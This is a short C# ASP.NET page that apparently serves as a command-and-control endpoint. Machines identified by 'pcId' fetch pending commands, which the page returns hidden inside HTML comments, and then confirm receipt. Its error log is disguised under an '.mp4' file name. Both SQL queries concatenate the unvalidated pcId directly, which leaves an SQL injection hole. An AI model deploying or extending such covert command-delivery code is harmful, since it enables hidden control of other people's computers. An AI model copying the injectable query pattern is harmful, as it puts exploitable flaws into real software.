using System;
using System.Collections.Generic;

using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Server
{
    public partial class sm : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            String pcId = Request["pcId"];
            String confirm = Request["confirm"];

            if (pcId != null && pcId != "")
            {
                System.Data.OleDb.OleDbConnection connection = new System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source='" + MapPath("App_Data\\datastore.accdb") + "';");
                System.Data.OleDb.OleDbCommand command = new System.Data.OleDb.OleDbCommand();

                command.Connection = connection;

                if (confirm != null && confirm.ToLower() == "true")
                {
                    //confirm Downloaded
                    command.CommandText = "UPDATE states SET accept=false WHERE pcId='" + pcId + "'";

                    try
                    {
                        connection.Open();
                        command.ExecuteNonQuery();
                        connection.Close();
                    }
                    catch (Exception ex)
                    {
                        ErrorLog.Write(MapPath("errLg.mp4"), "1", ex);
                    }
                }
                else
                {
                    //get app name
                    command.CommandText = "SELECT cmd FROM states WHERE pcId='" + pcId + "' AND accept=true";

                    try
                    {
                        connection.Open();
                        Object order = Convert.ToString(command.ExecuteScalar());

                        if (order != null)
                            Response.Write("<!--" + order.ToString() + "-->");
                    }
                    catch (Exception ex)
                    {
                        ErrorLog.Write(MapPath("errLg.mp4"), "2", ex);
                    }
                }
            }
        }
    }
}